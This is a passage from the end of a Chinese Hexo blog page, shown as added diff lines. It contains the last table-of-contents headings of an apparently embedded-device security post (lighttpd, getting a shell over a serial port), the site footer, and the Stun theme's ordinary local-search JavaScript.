+          make_elf</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9A%E4%BD%8D%E6%BC%8F%E6%B4%9E%E5%87%BD%E6%95%B0%E6%89%80%E5%9C%A8%E7%9A%84%E8%BF%9B%E7%A8%8B"><span class="toc-number">6.5.</span> <span class="toc-text">
+          定位漏洞函数所在的进程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lighttpd"><span class="toc-number">6.6.</span> <span class="toc-text">
+          lighttpd</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%B2%E5%8F%A3%E6%8B%BFshell"><span class="toc-number">6.7.</span> <span class="toc-text">
+          串口拿shell</span></a></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/uploads/zhishi1.jpg" alt="avatar"></div></div><div class="sidebar-ov-social"><a class="sidebar-ov-social-item" href="https://github.com/blingblingxuanxuan" target="_blank" rel="noopener" data-popover="Github" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-github"></i></span></a><a class="sidebar-ov-social-item" href="https://weibo.com/anxinbuzitreexy" target="_blank" rel="noopener" data-popover="微博" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-weibo"></i></span></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2021</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>blingbling</span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span> v5.3.0</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div><div class="busuanzi"><span class="busuanzi-siteuv"><span class="busuanzi-siteuv__icon"><i class="fas fa-user"></i></span><span class="busuanzi-siteuv__info">访问人数</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_uv"></span></span><span class="busuanzi-sitepv"><span class="busuanzi-siteuv__icon"><i class="fas fa-eye"></i></span><span class="busuanzi-siteuv__info">浏览总量</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_pv"></span></span></div><div>Just follow your heart, and keep smiling.</div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="搜索文章（支持多关键词，请用空格分隔）"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script>function initSearch() {
+  var isXML = true;
+  var search_path = 'search.json';
+
+  if (!search_path) {
+    search_path = 'search.xml';
+  } else if (/json$/i.test(search_path)) {
+    isXML = false;
+  }
+
+  var path = '/' + search_path;
+  $.ajax({
+    url: path,
+    dataType: isXML ? 'xml' : 'json',
+    async: true,
+    success: function (res) {
+      var datas = isXML ? $('entry', res).map(function () {
+        // 将 XML 转为 JSON
+        return {
+          title: $('title', this).text(),
+          content: $('content', this).text(),
+          url: $('url', this).text()
+        };
+      }).get() : res;
+      var $input = $('.search-input input');
+      var $result = $('.search-results');
+      // 搜索对象（标题、内容）的权重，影响显示顺序
+      var WEIGHT = { title: 100, content: 1 };
+      var searchPost = function () {
+        var searchText = $input.val().toLowerCase().trim();
+        // 根据空白字符分隔关键字
+        var keywords = searchText.split(/[\s]+/);
+        // 搜索结果
+        var matchPosts = [];
+
+        // 有多个关键字时，将原文字整个保存下来
+        if (keywords.length > 1) {
+          keywords.push(searchText);
+        }
+        // 防止未输入字符时搜索
+        if (searchText.length > 0) {
+          datas.forEach(function (data) {
+            var isMatch  = false;
+            // 没有标题的文章使用预设的 i18n 变量代替
+            var title = (data.title && data.title.trim()) || '[ 文章无标题 ]';
+            var titleLower = title && title.toLowerCase();
+            // 删除 HTML 标签 和 所有空白字符
+            var content = data.content && data.content.replace(/<[^>]+>/g, '');
+            var contentLower = content && content.toLowerCase();
+            // 删除重复的 /
+            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
+            // 标题中匹配到的关键词
+            var titleHitSlice = [];
+            // 内容中匹配到的关键词
+            var contentHitSlice = [];
+
+            keywords.forEach(function (keyword) {
+              /**
+              * 获取匹配的关键词的索引
+              * @param {String} keyword 要匹配的关键字
+              * @param {String} text 原文字
+              * @param {Boolean} caseSensitive 是否区分大小写
+              * @param {Number} weight 匹配对象的权重。权重大的优先显示
+              * @return {Array}
+              */
+              function getIndexByword (word, text, caseSensitive, weight) {
+                if (!word || !text) {
+                  return [];
+                };
+
+                var startIndex = 0; // 每次匹配的开始索引
+                var index = -1;     // 匹配到的索引值
+                var result = [];    // 匹配结果
+
+                if (!caseSensitive) {
+                  word = word.toLowerCase();
+                  text = text.toLowerCase();
+                }
+
+                while((index = text.indexOf(word, startIndex)) !== -1) {
+                  var hasMatch = false;
+                  // 索引位置相同的关键词，保留长度较长的
+                  titleHitSlice.forEach(function (hit) {
+                    if (hit.index === index && hit.word.length < word.length) {
+                      hit.word = word;
+                      hasMatch = true;
+                    }
+                  });
+                  startIndex = index + word.length;
+                  !hasMatch && result.push({ index: index, word: word, weight: weight });
+                }
+                return result;
+              }
+              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
+              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
+            });
+
+            var hitTitle = titleHitSlice.length;
+            var hitContent = contentHitSlice.length;
+
+            if (hitTitle > 0 || hitContent > 0) {
+              isMatch = true;
+            }
+            if (isMatch) {
+              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
+                // 按照匹配文字的索引的递增顺序排序
+                hit.sort(function (left, right) {
+                  return left.index - right.index;
+                });
+              });
+              /**
+              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
+              * @param {String} text 原文本
+              * @param {Array} hitSlice 匹配项的索引信息
+              * @param {Number} start 开始索引
+              * @param {Number} end 结束索引
+              * @return {String}
+              */
+              function highlightKeyword (text, hitSlice, start, end) {
+                if (!text || !hitSlice || !hitSlice.length) {
+                  return;
+                }
+
+                var result = '';
+                var startIndex = start;
+                var endIndex = end;
+                hitSlice.forEach(function (hit) {
+                  if (hit.index < startIndex) {
+                    return;
+                  }
+
+                  var hitWordEnd = hit.index + hit.word.length;
+                  result += text.slice(startIndex, hit.index);
+                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
+                  startIndex = hitWordEnd;
+                });
+                result += text.slice(startIndex, endIndex);
+                return result;
+              }
+
+              var postData = {};
+              // 文章总的搜索权重
+              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
+              // 标记匹配关键词后的标题
+              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
+              // 标记匹配关键词后的内容
+              var postContent;
+              // 显示内容的长度
+              var SHOW_WORD_LENGTH = 200;
+              // 命中关键词前的字符显示长度
+              var SHOW_WORD_FRONT_LENGTH = 20;
+              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;
+
+              // 截取匹配的第一个字符，前后共 200 个字符来显示
+              if (contentHitSlice.length > 0) {
+                var firstIndex = contentHitSlice[0].index;
+                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
+                var end = firstIndex + SHOW_WORD_END_LENGTH;
+                postContent = highlightKeyword(content, contentHitSlice, start, end);
+              } else { // 未匹配到内容，直接截取前 200 个字符来显示
+                postContent = content.slice(0, SHOW_WORD_LENGTH);
+              }
+              postData.title = postTitle;
+              postData.content = postContent;
+              postData.url = postURL;
+              postData.weight = postWeight;
+              matchPosts.push(postData);
+            }
+          });
+        }
+
+        var resultInnerHtml = '';
+        if (matchPosts.length) {
+          // 按权重递增的顺序排序，使权重大的优先显示
+          matchPosts.sort(function (left, right) {
+            return right.weight - left.weight;
+          });
+          resultInnerHtml += '<ul>';
+          matchPosts.forEach(function (post) {
+            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
+            resultInnerHtml += post.title;
+            resultInnerHtml += '</a><div class="search-results-content">';
+            resultInnerHtml += post.content;
+            resultInnerHtml += '</div></li>';
+          });
+          resultInnerHtml += '</ul>';
+        } else {
+          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
+        }
+        $result.html(resultInnerHtml);
+      };
+      $input.on('input', searchPost);
+      $input.on('keyup', function (e) {
+        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
+          searchPost();
+        }
+      });
+    }
+  });
+}
+
+function closeSearch () {
+  $('body').css({ overflow: 'auto' });
+  $('.search-popup').css({ display: 'none' });
+  $('.search-mask').css({ display: 'none' });
+}
+
+window.addEventListener('DOMContentLoaded', function () {
+  Stun.utils.pjaxReloadLocalSearch = function () {
+    $('.header-nav-search').on('click', function (e) {
+      e.stopPropagation();
+      $('body').css('overflow', 'hidden');
+      $('.search-popup')
+        .velocity('stop')
+        .velocity('transition.expandIn', {
+          duration: 300,
+          complete: function () {
+            $('.search-popup input').focus();
+          }
+        });
+      $('.search-mask')
+        .velocity('stop')
+        .velocity('transition.fadeIn', {
+          duration: 300
+        });
+
+      initSearch();
+    });
+    $('.search-mask, .search-close').on('click', function () {
+      closeSearch();
+    });
+    $(document).on('keydown', function (e) {
+      // Escape <=> 27
+      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
+        closeSearch();
+      }
+    });
+  };
+
+  Stun.utils.pjaxReloadLocalSearch();
+}, false);
+
+function safeOpenUrl(url) {
+  var newTab = window.open();
+  newTab.opener = null;
+  newTab.location = url;
+}
+
+function extSearch(engine) {
+  var engines = {
+    google: 'https://www.google.com/search?q=',
+    bing: 'https://cn.bing.com/search?q=',
+    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
+  };
+  var host = window.location.host;
+  var query = $('.search-input input').val().toLowerCase().trim();
+  var uri = engines[engine] + query + ' site:' + host;
+
+  if (query) {
+    safeOpenUrl(uri);
+  } else {
+    Stun.utils.popAlert('warning', '请输入字符');
+  }
+}
+
+var assistSearchList = window.CONFIG.assistSearch;
+
+if (Array.isArray(assistSearchList)) {
+  assistSearchList.forEach(function (name) {
+    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
+      extSearch(name);
+    }, false);
+  });
+}</script><script src="https://cdn.jsdelivr.net/gh/sukkaw/busuanzi@latest/bsz.pure.mini.js" async></script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script></body></html>
